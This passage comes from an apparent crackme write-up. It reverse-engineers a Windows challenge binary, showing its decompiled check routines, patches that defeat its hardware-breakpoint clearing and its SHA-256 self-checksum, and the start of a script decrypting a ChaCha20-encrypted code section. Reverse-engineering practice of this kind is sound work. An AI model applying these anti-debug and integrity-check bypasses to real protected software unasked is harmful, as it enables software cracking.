class="built_in">dd</span> offset sub_405536</span><br><span class="line"><span class="symbol">.rdata:</span>0040B400                 <span class="built_in">dd</span> offset sub_404E71</span><br><span class="line"><span class="symbol">.rdata:</span>0040B404                 <span class="built_in">dd</span> offset sub_405497</span><br></pre></td></tr></table></figure>

<p>Interface selection function:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __userpurge sub_405536@&lt;eax&gt;(<span class="type">int</span> a1@&lt;ecx&gt;, <span class="type">int</span> a2@&lt;ebx&gt;, __int16 a3, <span class="type">int</span> a4)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">switch</span> ( a3 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1001</span>:</span><br><span class="line">      <span class="built_in">sub_405399</span>(a1, a2);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1002</span>:</span><br><span class="line">      hInstance = *(HINSTANCE *)(a1 + <span class="number">4</span>);</span><br><span class="line">      <span class="built_in">sub_4025EC</span>(v7, &amp;unk_40B3CD);</span><br><span class="line">      <span class="built_in">sub_40574D</span>(hInstance, <span class="number">132</span>, v7[<span class="number">0</span>], v7[<span class="number">1</span>], v7[<span class="number">2</span>], v7[<span class="number">3</span>], v7[<span class="number">4</span>], v7[<span class="number">5</span>]);</span><br><span class="line">      <span class="built_in">sub_404E89</span>((LPARAM)dwInitParam, *(HWND *)(a1 + <span class="number">8</span>));</span><br><span class="line">      <span class="built_in">sub_4057DA</span>(dwInitParam);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1003</span>:</span><br><span class="line">      <span class="built_in">EndDialog</span>(*(HWND *)(a1 + <span class="number">8</span>), <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1007</span>:</span><br><span class="line">      <span class="built_in">sub_405702</span>();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1010</span>:</span><br><span class="line">      <span class="built_in">ShellExecuteA</span>(<span class="number">0</span>, <span class="string">&quot;open&quot;</span>, <span class="string">&quot;https://crackmes.one&quot;</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>For the check part:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> __usercall sub_405399@&lt;eax&gt;(<span class="type">int</span> a1@&lt;ecx&gt;, <span class="type">int</span> a2@&lt;ebx&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">memset</span>(input_, <span class="number">0</span>, <span class="built_in">sizeof</span>(input_));</span><br><span class="line">  <span class="built_in">GetDlgItemTextA</span>(*(HWND *)(a1 + <span class="number">8</span>), <span class="number">1006</span>, input_, <span class="number">255</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">sub_4030A5</span>(*(_DWORD **)(a1 + <span class="number">20</span>), a2, (<span class="type">int</span>)input_) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">sub_4025EC</span>(Src_1, input_);</span><br><span class="line">    <span class="built_in">sub_40268B</span>(v16, (<span class="type">int</span>)Src_1);</span><br><span class="line">    <span class="built_in">sub_405724</span>((<span class="type">int</span>)Src_1);</span><br><span class="line">    <span class="built_in">sub_402876</span>(Src, (<span class="type">int</span>)v17);</span><br><span class="line">    hInstance = *(HINSTANCE *)(a1 + <span class="number">4</span>);</span><br><span class="line">    <span class="built_in">sub_40515A</span>(&amp;v6, Src);</span><br><span class="line">    <span class="built_in">sub_40574D</span>(dwInitParam, hInstance, <span class="number">134</span>, v6, v7, v8, v9, v10, v11);</span><br><span class="line">    <span class="built_in">sub_404E89</span>((LPARAM)dwInitParam, *(HWND *)(a1 + <span class="number">8</span>));</span><br><span class="line">    <span class="built_in">sub_4057DA</span>(dwInitParam);</span><br><span class="line">    <span class="built_in">sub_405724</span>((<span class="type">int</span>)Src);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sub_402781</span>(v16);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    hInstance_1 = *(HINSTANCE *)(a1 + <span class="number">4</span>);</span><br><span class="line">    <span class="built_in">sub_4025EC</span>(&amp;v6, &amp;unk_40B3CE);</span><br><span class="line">    <span class="built_in">sub_40574D</span>(dwInitParam, hInstance_1, <span class="number">136</span>, v6, v7, v8, v9, v10, v11);</span><br><span class="line">    <span class="built_in">sub_404E89</span>((LPARAM)dwInitParam, *(HWND *)(a1 + <span class="number">8</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sub_4057DA</span>(dwInitParam);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The <code>sub_4030A5</code> is the input processing function:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> __userpurge sub_4030A5@&lt;al&gt;(<span class="type">int</span> *a1@&lt;ecx&gt;, <span class="type">int</span> a2@&lt;ebx&gt;, <span class="type">int</span> input)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( !input )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="built_in">sub_40448C</span>();</span><br><span class="line">  <span class="built_in">sub_4046C8</span>((<span class="type">int</span>)v5, *a1, a1[<span class="number">1</span>], a1[<span class="number">2</span>], a1[<span class="number">3</span>]);</span><br><span class="line">  v6 = <span class="built_in">sub_408AAA</span>(<span class="number">0x14u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    *v6 = <span class="number">0</span>;</span><br><span class="line">    v6[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    v6[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    v6[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">    v6[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">    v7 = (<span class="type">void</span> *)((<span class="built_in">int</span> (*)(<span class="type">void</span>))loc_40A000)();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v7 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  n20 = <span class="number">20</span>;</span><br><span class="line">  v8 = (*(<span class="built_in">int</span> (__thiscall **)(<span class="type">void</span> *, <span class="type">int</span>, <span class="type">int</span>))byte_40A025)(v7, input, a2);</span><br><span class="line">  <span class="built_in">sub_408ADA</span>(v7);</span><br><span class="line">  v9 = <span class="built_in">sub_40448C</span>();</span><br><span class="line">  <span class="built_in">sub_404732</span>((<span class="type">int</span>)v9);</span><br><span class="line">  <span class="keyword">return</span> v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>At sub_4046C8, once 0x80000003 and several times 0x80000004 were triggered. Next, the program runs to a custom section <code>.pc</code> at 0x40A000. This area is filled with illegal instructions and soon caused exception 0x80000001:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __thiscall <span class="title">Handler_0x80000001</span><span class="params">(<span class="type">int</span> <span class="keyword">this</span>, <span class="type">int</span> a2, <span class="type">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( **(_BYTE **)(<span class="keyword">this</span> + <span class="number">36</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">sub_4037C9</span>();</span><br><span class="line">    <span class="keyword">if</span> ( *(_DWORD *)(a2 + <span class="number">16</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      n8 = *(_DWORD *)(a2 + <span class="number">20</span>);</span><br><span class="line">      <span class="keyword">if</span> ( n8 &lt; <span class="number">2</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">sub_4037CD</span>(**(_DWORD **)(<span class="keyword">this</span> + <span class="number">28</span>), *(_DWORD *)(*(_DWORD *)(<span class="keyword">this</span> + <span class="number">28</span>) + <span class="number">8</span>));</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( n8 == <span class="number">8</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 = a3;</span><br><span class="line">        v6 = *(<span class="type">char</span> **)(a3 + <span class="number">184</span>);</span><br><span class="line">        <span class="keyword">if</span> ( <span class="built_in">sub_4044FA</span>((_DWORD *)<span class="keyword">this</span>, (<span class="type">unsigned</span> <span class="type">int</span>)v6) )</span><br><span class="line">        &#123;</span><br><span class="line">          *(_DWORD *)(<span class="keyword">this</span> + <span class="number">60</span>) = v6;</span><br><span class="line">          <span class="built_in">sub_40413B</span>((<span class="type">void</span> *)<span class="keyword">this</span>, v5, v6);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">sub_4037FA</span>(&amp;a3);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The a2 is the kind of exception, and <code>a3 + 184</code> is <code>CONTEXT.Eip</code>. In sub_4037FA, the a1 points to DR (Debug Registers), and this function set DR0, DR6 and DR7 to 0, which equivalents to clearing all hardware breakpoints:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __stdcall <span class="title">sub_4037FA</span><span class="params">(<span class="type">int</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  *(_DWORD *)(*a1 + <span class="number">24</span>) = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)(*a1 + <span class="number">20</span>) = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)(*a1 + <span class="number">4</span>) = <span class="number">0</span>;</span><br><span class="line">  result = *a1;</span><br><span class="line">  *(_DWORD *)(*a1 + <span class="number">192</span>) |= <span class="number">0x100u</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Patch to:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __stdcall <span class="title">sub_4037FA</span><span class="params">(<span class="type">int</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  result = *a1;</span><br><span class="line">  *(_DWORD *)(*a1 + <span class="number">192</span>) |= <span class="number">0x100u</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>At sub_40413B, there’s an algorithm:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __thiscall <span class="title">sub_40413B</span><span class="params">(<span class="type">void</span> *<span class="keyword">this</span>, <span class="type">int</span> a2, <span class="type">char</span> *Src)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  v3 = <span class="built_in">sub_403FBA</span>((<span class="type">int</span>)<span class="keyword">this</span>, Src);</span><br><span class="line">  <span class="built_in">sub_404684</span>((<span class="type">int</span>)&amp;a2, (<span class="type">int</span>)v3);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">sub_4037FA</span>(&amp;a2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">char</span> *__thiscall <span class="title">sub_403FBA</span><span class="params">(<span class="type">int</span> <span class="keyword">this</span>, <span class="type">char</span> *Src)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">sub_404286</span>((<span class="type">int</span> **)<span class="keyword">this</span>);</span><br><span class="line">  <span class="built_in">sub_40464A</span>((_DWORD *)<span class="keyword">this</span>);</span><br><span class="line">  Src_1 = Src;</span><br><span class="line">  v4 = <span class="built_in">sub_404059</span>((<span class="type">size_t</span> *)<span class="keyword">this</span>, Src);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">sub_40477E</span>((<span class="type">char</span> *)v4) )</span><br><span class="line">  &#123;</span><br><span class="line">    Src_2 = (<span class="type">char</span> *)<span class="built_in">sub_40479C</span>((_DWORD *)<span class="keyword">this</span>, *(_DWORD *)(<span class="keyword">this</span> + <span class="number">4</span>), <span class="number">12288</span>, <span class="number">64</span>);</span><br><span class="line">    *(_DWORD *)(<span class="keyword">this</span> + <span class="number">56</span>) = Src_2;</span><br><span class="line">    Src = Src_2;</span><br><span class="line">    <span class="built_in">sub_403A69</span>((<span class="type">int</span> *)(<span class="keyword">this</span> + <span class="number">48</span>), v7, &amp;Src);</span><br><span class="line">    <span class="built_in">memcpy</span>(*(<span class="type">void</span> **)(<span class="keyword">this</span> + <span class="number">56</span>), v4, *(_DWORD *)<span class="keyword">this</span>);</span><br><span class="line">    Src_1 = *(<span class="type">char</span> **)(<span class="keyword">this</span> + <span class="number">56</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(Src_1, v4, *(_DWORD *)<span class="keyword">this</span>);</span><br><span class="line">    Src = &amp;Src_1[-**(_DWORD **)(<span class="keyword">this</span> + <span class="number">28</span>)];</span><br><span class="line">    <span class="built_in">sub_4039D4</span>((<span class="type">int</span> *)(<span class="keyword">this</span> + <span class="number">40</span>), v7, &amp;Src);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">j_j_free_0</span>(v4);</span><br><span class="line">  <span class="keyword">return</span> Src_1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> *__thiscall <span class="title">sub_404059</span><span class="params">(<span class="type">size_t</span> *<span class="keyword">this</span>, <span class="type">char</span> *Src)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  v3 = <span class="built_in">sub_408AE8</span>(*<span class="keyword">this</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(v3, Src, *<span class="keyword">this</span>);</span><br><span class="line">  v4 = &amp;Src[-*(_DWORD *)<span class="keyword">this</span>[<span class="number">7</span>]];</span><br><span class="line">  v10[<span class="number">0</span>] = <span class="number">0xD0C0B0A</span>;</span><br><span class="line">  v10[<span class="number">1</span>] = <span class="number">0x11100F0E</span>;</span><br><span class="line">  v5 = (<span class="type">char</span> *)<span class="built_in">sub_403477</span>();</span><br><span class="line">  v6 = <span class="built_in">sub_40330A</span>(v5);</span><br><span class="line">  <span class="built_in">sub_401E39</span>(src_, (<span class="type">int</span>)v6, (<span class="type">int</span>)v10, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">sub_4022B8</span>((<span class="type">int</span>)src_, (<span class="type">unsigned</span> <span class="type">int</span>)v4);</span><br><span class="line">  <span class="built_in">sub_401F4D</span>(src_, v7, (<span class="type">int</span>)v3, <span class="number">0x10u</span>);</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">_DWORD *__thiscall <span class="title">sub_401E39</span><span class="params">(_DWORD *<span class="keyword">this</span>, <span class="type">int</span> a2, <span class="type">int</span> a3, <span class="type">int</span> a4, <span class="type">int</span> a5)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">sub_401E67</span>(<span class="keyword">this</span>, a2, a3);</span><br><span class="line">  <span class="keyword">this</span>[<span class="number">12</span>] = a4;</span><br><span class="line">  <span class="keyword">this</span>[<span class="number">13</span>] = a5;</span><br><span class="line">  this_1 = <span class="keyword">this</span>;</span><br><span class="line">  <span class="keyword">this</span>[<span class="number">32</span>] = <span class="number">64</span>;</span><br><span class="line">  <span class="keyword">return</span> this_1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">_DWORD *__thiscall <span class="title">sub_401E67</span><span class="params">(_DWORD *<span class="keyword">this</span>, <span class="type">int</span> a2, <span class="type">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  key[<span class="number">0</span>] = <span class="number">0xB979379E</span>;</span><br><span class="line">  key[<span class="number">1</span>] = <span class="number">0x157C4A7F</span>;</span><br><span class="line">  key[<span class="number">2</span>] = <span class="number">0x60C09CF3</span>;</span><br><span class="line">  key[<span class="number">3</span>] = <span class="number">0x34C8ED5C</span>;</span><br><span class="line">  *<span class="keyword">this</span> = <span class="built_in">sub_402292</span>(key);</span><br><span class="line">  <span class="keyword">this</span>[<span class="number">1</span>] = <span class="built_in">sub_402292</span>(&amp;key[<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">this</span>[<span class="number">2</span>] = <span class="built_in">sub_402292</span>(&amp;key[<span class="number">2</span>]);</span><br><span class="line">  <span class="keyword">this</span>[<span class="number">3</span>] = <span class="built_in">sub_402292</span>(&amp;key[<span class="number">3</span>]);</span><br><span class="line">  <span class="keyword">this</span>[<span class="number">4</span>] = <span class="built_in">sub_402292</span>(a2);</span><br><span class="line">  <span class="keyword">this</span>[<span class="number">5</span>] = <span class="built_in">sub_402292</span>(a2 + <span class="number">4</span>);</span><br><span class="line">  <span class="keyword">this</span>[<span class="number">6</span>] = <span class="built_in">sub_402292</span>(a2 + <span class="number">8</span>);</span><br><span class="line">  <span class="keyword">this</span>[<span class="number">7</span>] = <span class="built_in">sub_402292</span>(a2 + <span class="number">12</span>);</span><br><span class="line">  <span class="keyword">this</span>[<span class="number">8</span>] = <span class="built_in">sub_402292</span>(a2 + <span class="number">16</span>);</span><br><span class="line">  <span class="keyword">this</span>[<span class="number">9</span>] = <span class="built_in">sub_402292</span>(a2 + <span class="number">20</span>);</span><br><span class="line">  <span class="keyword">this</span>[<span class="number">10</span>] = <span class="built_in">sub_402292</span>(a2 + <span class="number">24</span>);</span><br><span class="line">  <span class="keyword">this</span>[<span class="number">11</span>] = <span class="built_in">sub_402292</span>(a2 + <span class="number">28</span>);</span><br><span class="line">  <span class="keyword">this</span>[<span class="number">12</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">this</span>[<span class="number">13</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">this</span>[<span class="number">14</span>] = <span class="built_in">sub_402292</span>(a3);</span><br><span class="line">  <span class="keyword">this</span>[<span class="number">15</span>] = <span class="built_in">sub_402292</span>(a3 + <span class="number">4</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The array a2 is 8 dwords at 0x40D268, generated from the program’s .text section’s sha256 hash. This means we can’t set software breakpoints and patch the program before the checksum finished. The right checksum is <code>F6 30 AA 38 D5 72 97 37 5D 64 55 59 C3 34 FD 50 D5 5C A1 D1 77 D2 65 5A 04 23 51 CF 69 24 4B F2</code>.  After patching the checksum:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_DWORD *__thiscall <span class="title">sub_401E67</span><span class="params">(_DWORD *<span class="keyword">this</span>, <span class="type">int</span> a2, <span class="type">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  v5[<span class="number">0</span>] = <span class="number">0xB979379E</span>;</span><br><span class="line">  v5[<span class="number">1</span>] = <span class="number">0x157C4A7F</span>;</span><br><span class="line">  v5[<span class="number">2</span>] = <span class="number">0x60C09CF3</span>;</span><br><span class="line">  v5[<span class="number">3</span>] = <span class="number">0x34C8ED5C</span>;</span><br><span class="line">  *<span class="keyword">this</span> = <span class="built_in">sub_402292</span>(v5);</span><br><span class="line">  <span class="keyword">this</span>[<span class="number">1</span>] = <span class="built_in">sub_402292</span>(&amp;v5[<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">this</span>[<span class="number">2</span>] = <span class="built_in">sub_402292</span>(&amp;v5[<span class="number">2</span>]);</span><br><span class="line">  <span class="keyword">this</span>[<span class="number">3</span>] = <span class="built_in">sub_402292</span>(&amp;v5[<span class="number">3</span>]);</span><br><span class="line">  <span class="keyword">this</span>[<span class="number">4</span>] = <span class="number">0x38AA30F6</span>;</span><br><span class="line">  <span class="keyword">this</span>[<span class="number">5</span>] = <span class="number">0x379772D5</span>;</span><br><span class="line">  <span class="keyword">this</span>[<span class="number">6</span>] = <span class="number">0x5955645D</span>;</span><br><span class="line">  <span class="keyword">this</span>[<span class="number">7</span>] = <span class="number">0x50FD34C3</span>;</span><br><span class="line">  <span class="keyword">this</span>[<span class="number">8</span>] = <span class="number">0xD1A15CD5</span>;</span><br><span class="line">  <span class="keyword">this</span>[<span class="number">9</span>] = <span class="number">0x5A65D277</span>;</span><br><span class="line">  <span class="keyword">this</span>[<span class="number">10</span>] = <span class="number">0xCF512304</span>;</span><br><span class="line">  <span class="keyword">this</span>[<span class="number">11</span>] = <span class="number">0xF24B2469</span>;</span><br><span class="line">  <span class="keyword">this</span>[<span class="number">12</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">this</span>[<span class="number">13</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">this</span>[<span class="number">14</span>] = <span class="built_in">sub_402292</span>(a3);</span><br><span class="line">  <span class="keyword">this</span>[<span class="number">15</span>] = <span class="built_in">sub_402292</span>(a3 + <span class="number">4</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>the program successfully returns the “try again” window. The self-decrypt algorithm is a modified chacha20. Decrypt the .pc section:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rotl32</span>(<span class="params">x, n</span>): <span class="keyword">return</span> ((x &lt;&lt; n) | (x &gt;&gt; (<span class="number">32</span> - n))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">quarter_round</span>(<span class="params">x, a, b, c, d</span>):</span><br><span class="line">    x[a] = (x[a] + x[b]) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    x[d] ^= 